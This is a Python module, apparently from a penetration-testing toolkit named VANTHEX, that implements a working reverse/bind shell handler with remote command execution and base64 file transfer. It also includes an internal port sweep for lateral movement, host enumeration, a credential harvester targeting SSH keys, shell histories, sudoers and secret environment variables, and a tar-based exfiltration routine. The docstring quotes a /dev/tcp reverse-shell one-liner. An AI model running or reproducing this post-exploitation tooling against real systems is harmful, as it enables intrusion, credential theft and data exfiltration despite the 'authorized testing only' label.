"""
ShellHandler v1 — reverse/bind shell handler for VANTHEX. AUTHORIZED TESTING ONLY.

Listener/connector module that connects to a shell on the system under test
(own/lab/authorized engagement). Two modes:

- *reverse* (listener): bind a port, wait for an incoming connection from the
  target; the target initiates e.g. `bash -i >& /dev/tcp/<host>/<port> 0>&1`.
- *bind* (connector): we take the initiative to connect to a port the target opened.

command() wraps the command with the `;echo __VHX_DONE__` marker so output
is read reliably until completion — works over raw TCP without a PTY for
scripting/scanning. File transfer via base64 chunks (upload & download). Stdlib
only, no cross-import to vulnscan2 (avoids circular imports).
"""
import base64
import binascii
import re as _re
import socket
import threading
import time

DONE_MARK = "__VHX_DONE__"
DONE_FULL = b"__VHX_DONE__"
DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 4444
DATA_BUF = 65536
READ_TIMEOUT = 1.0
TRANSFER_CHUNK = 1800


class HandlerError(Exception):
    pass


class ShellHandler:
    """Shell (reverse/bind) connection handler with command + file transfer."""

    def __init__(self, host=DEFAULT_HOST, port=DEFAULT_PORT, mode="reverse"):
        if mode not in ("reverse", "bind"):
            raise HandlerError(f"unknown mode: {mode}")
        self.mode = mode
        self.host = host
        self.port = int(port)
        self._sock = None
        self._conn = None
        self._lock = threading.Lock()
        self._rx_buf = b""
        self._cb = None

    # -------------------------------------------------------- lifecycle
    def start(self):
        if self.mode == "reverse":
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self.host, self.port))
            s.listen(1)
            s.settimeout(600)
            self._sock = s
            self._log({"event": "listen", "where": f"{self.host}:{self.port}"})
        else:
            self._connect()

    def wait_for_connection(self, timeout=600):
        if self.mode != "reverse" or not self._sock:
            return self._conn is not None
        try:
            c, addr = self._sock.accept()
        except socket.timeout:
            return False
        c.settimeout(READ_TIMEOUT)
        self._conn = c
        self._log({"event": "accept", "peer": f"{addr[0]}:{addr[1]}"})
        return True

    def _connect(self):
        try:
            c = socket.create_connection((self.host, self.port), timeout=30)
        except Exception as e:
            raise HandlerError(f"connection failed: {e}")
        c.settimeout(READ_TIMEOUT)
        self._conn = c
        self._log({"event": "connect", "peer": f"{self.host}:{self.port}"})

    def stop(self):
        for s in (self._conn, self._sock):
            try:
                if s is not None:
                    s.close()
            except Exception:
                pass
        self._conn = self._sock = None

    def alive(self):
        return self._conn is not None

    def _log(self, d):
        if self._cb:
            try:
                self._cb(d)
            except Exception:
                pass

    def on_log(self, cb):
        self._cb = cb

    # -------------------------------------------------------- transport
    def _send(self, data):
        if not self._conn:
            raise HandlerError("no connection")
        with self._lock:
            self._conn.sendall(data)

    def _recv_until(self, patterns, timeout):
        """Read until any of the byte regex patterns matches (processed vs bash -i echo).

        Consumes the buffer up to the LAST REAL marker (a digit from the
        `$?` expansion), because bash -i echoes its own command — the literal
        marker `__VHX_DONE__$?` does not match the pattern `__VHX_DONE__\\d+`, so we
        stop only once the command has actually been executed.
        """
        buf = self._rx_buf
        self._rx_buf = b""
        deadline = time.time() + timeout
        while True:
            ends = []
            for p in patterns:
                for m in p.finditer(buf):
                    ends.append(m.end())
            if ends:
                end = max(ends)
                consumed = buf[:end]
                self._rx_buf = buf[end:]
                return consumed
            remain = deadline - time.time()
            if remain <= 0:
                break
            try:
                chunk = self._conn.recv(DATA_BUF)
            except socket.timeout:
                continue
            if not chunk:
                break
            buf += chunk
        self._rx_buf = buf
        return buf

    def command(self, cmd, timeout=20):
        """Send a shell command, read output until the completion marker (echo-proof)."""
        if not self._conn:
            raise HandlerError("no connection")
        wrapped = f"{cmd} ; echo {DONE_MARK}$? ; echo {DONE_MARK}end\n"
        try:
            with self._lock:
                self._conn.sendall(wrapped.encode())
        except Exception as e:
            raise HandlerError(f"send failed: {e}")
        patterns = (_re.compile(rb"__VHX_DONE__\d+"),)
        raw = self._recv_until(patterns, timeout=timeout)
        self._log({"dir": "tx", "data": cmd[:120]})
        return self._post(raw, cmd)

    @staticmethod
    def _post(raw: bytes, cmd: str = "") -> str:
        """Convert raw output -> clean text (strip command echo + markers)."""
        try:
            text = raw.decode("utf-8", "replace")
        except Exception:
            text = raw.decode("latin-1", "replace")
        # cut at the last REAL marker (the one with a digit)
        ends = [m.end() for m in _re.finditer(r"__VHX_DONE__\d+", text)]
        if ends:
            text = text[: max(ends)]
        # strip command echo (bash -i re-types with backspaces) — remove
        # control characters and leftover markers at the end
        text = _re.sub(r"[\x08\r]", "", text)
        text = _re.sub(r"__VHX_DONE__\d+.*$", "", text)
        text = text.replace("echo __VHX_DONE__end", "")
        # drop the command echo line that bash -i sends to stdout
        idx = text.find("; echo __VHX_DONE__$?")
        if idx >= 0:
            text = text[idx + len("; echo __VHX_DONE__$?"):]
        text = text.lstrip("\r\n\t ;")
        return text

    # -------------------------------------------------------- file
    def send_file(self, local_path, remote_path):
        """Upload a file to the target via base64 chunks + echo (no dependencies)."""
        with open(local_path, "rb") as fh:
            data = fh.read()
        if not data:
            return 0
        b64 = base64.b64encode(data).decode()
        if not self.alive():
            raise HandlerError("no connection")
        pos = 0
        first = True
        while True:
            blob = b64[pos: pos + TRANSFER_CHUNK]
            op = ">" if first else ">>"
            cmd = f"echo {blob} | base64 -d {op} '{remote_path}'\n"
            try:
                with self._lock:
                    self._conn.sendall(cmd.encode())
            except Exception as e:
                raise HandlerError(f"send failed: {e}")
            first = False
            pos += TRANSFER_CHUNK
            if pos >= len(b64):
                break
        self._log({"dir": "upload", "bytes": len(data),
                   "remote": remote_path})
        return len(data)

    def recv_file(self, remote_path, local_path, timeout=30):
        """Fetch a file from the target via base64 + explicit delimiters (noise-proof)."""
        # B64START/B64END wrap the base64 data so surrounding shell
        # prompt/noise is discarded too — only the content between the
        # two delimiters is read.
        cmd = (f"printf 'VHXB64S'; base64 -w0 < '{remote_path}'; "
               f"printf 'VHXB64E' ; echo {DONE_MARK}$? ; echo {DONE_MARK}end")
        out = self.command(cmd, timeout=timeout)
        marker_s = "VHXB64S"
        marker_e = "VHXB64E"
        # bash -i echoes its own command to stdout, so the first marker
        # appears inside the command echo — take the LAST occurrence (the
        # real data always comes after the echo).
        idx_s = out.rfind(marker_s)
        if idx_s >= 0:
            seg = out[idx_s + len(marker_s):]
            b64 = seg.split(marker_e, 1)[0] if marker_e in seg else ""
        else:
            b64 = ""
        if not b64:
            raise HandlerError("no base64 data in target response")
        while len(b64) % 4:
            b64 += "="
        try:
            raw = base64.b64decode(b64, validate=False)
        except binascii.Error as e:
            raise HandlerError(f"target base64 decode failed: {e}")
        with open(local_path, "wb") as fh:
            fh.write(raw)
        return len(raw)

    # -------------------------------------------------------- sweep
    def sweep(self, host="127.0.0.1", ports=(22, 80, 443, 3306, 5432, 6379,
                                             8080, 8000, 8443, 9200, 3000,
                                             5000, 9090, 22),
              timeout=40):
        """Sweep internal ports on the target's mesh (lateral-movement recon).

        Works through the shell: `nc -z -w1` if available, falling back to a
        bash `/dev/tcp` probe. Result {port: open} + a note when nc is absent.
        TCP probes only (can be blocked by the target).
        """
        ports = list(dict.fromkeys(int(p) for p in ports))
        probe = (f"for p in {' '.join(map(str, ports))}; do "
                 f"(echo >/dev/tcp/{host}/$p) >/dev/null 2>&1 && "
                 f"echo \"$p open\"; done")
        try:
            out = self.command(probe, timeout=timeout)
        except Exception as e:
            return {"error": f"<err {e}>"}
        open_ports = []
        for line in (out or "").splitlines():
            m = _re.match(r"\s*(\d+)\s+open", line)
            if m:
                open_ports.append(int(m.group(1)))
        return {"host": host, "ports": sorted(set(open_ports)),
                "raw": (out or "").strip()}

    def enum(self):
        """Collect basic host info from the target: identity, OS, network, services."""
        out = {}
        probes = (
            ("basic", "id; uname -a; hostname; cat /etc/os-release 2>/dev/null | head -3"),
            ("network", "ifconfig 2>/dev/null | grep 'inet '; ip a 2>/dev/null | grep 'inet '"),
            ("users", "ls /home/ 2>/dev/null; cat /etc/passwd 2>/dev/null | cut -d: -f1,3,6 | head"),
            ("services", "ps aux 2>/dev/null | head -8"),
        )
        for label, cmdline in probes:
            try:
                out[label] = self.command(cmdline).strip()
            except Exception as e:
                out[label] = f"<err {e}>"
        return out

    # -------------------------------------------------------- grab
    def grab(self, target_dirs=None):
        """Grab sensitive material from the target (config/hash/history/ssh).

        Collects {label: output}. Pure function when there is no connection
        -> returns command descriptions only; with an active connection,
        runs and collects output (Read-only: only reads files).
        """
        dirs = target_dirs or [
            "/etc", "/opt", "/var/www", "/srv", "/home", "/root", "/app",
        ]
        probes = (
            ("ssh_keys", "find /root /home -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null"),
            ("shell_history", "find /root /home -name '.*_history' 2>/dev/null | head -10"),
            ("sudoers", "grep -E '^[^#].*NOPASSWD|^[^#].*(ALL)' /etc/sudoers 2>/dev/null; ls /etc/sudoers.d 2>/dev/null"),
            ("crontabs", "cat /etc/crontab 2>/dev/null; ls /etc/cron.* 2>/dev/null | head"),
            ("passwd_uids", "awk -F: '$3==0{print $1\":\"$3\":\"$6}' /etc/passwd 2>/dev/null"),
            ("env", "env 2>/dev/null | grep -iE 'pass|secret|key|token|api' "),
        )
        out = {}
        for label, cmdline in probes:
            try:
                out[label] = self.command(cmdline).strip()
            except Exception as e:
                out[label] = f"<err {e}>"
        # look for web config files (small/deliberate; without copying the whole disk)
        cfg_look = " ".join(
            "ls '%s' 2>/dev/null" % d for d in dirs[:6])
        try:
            out["cfg_dirs"] = self.command(cfg_look).strip()
        except Exception as e:
            out["cfg_dirs"] = f"<err {e}>"
        return out

    # -------------------------------------------------------- exfil
    def exfil(self, remote_path, local_path, timeout=60):
        """Tar + base64 a path (file/directory) then download it locally."""
        cmd = (f"tar -cf - -C / {remote_path.lstrip('/')} 2>/dev/null | "
               f"base64 -w0")
        # use recv_file-style delimiters here too
        full = (f"printf 'VHXB64S'; {cmd}; printf 'VHXB64E' ; "
                f"echo {DONE_MARK}$? ; echo {DONE_MARK}end")
        out = self.command(full, timeout=timeout)
        b64 = None
        idx_s = out.rfind("VHXB64S")
        if idx_s >= 0:
            seg = out[idx_s + len("VHXB64S"):]
            b64 = seg.split("VHXB64E", 1)[0] if "VHXB64E" in seg else None
        if not b64:
            raise HandlerError("exfil: no data (path may not exist?)")
        while len(b64) % 4:
            b64 += "="
        try:
            raw = base64.b64decode(b64, validate=False)
        except binascii.Error as e:
            raise HandlerError(f"exfil decode failed: {e}")
        with open(local_path, "wb") as fh:
            fh.write(raw)
        return len(raw)
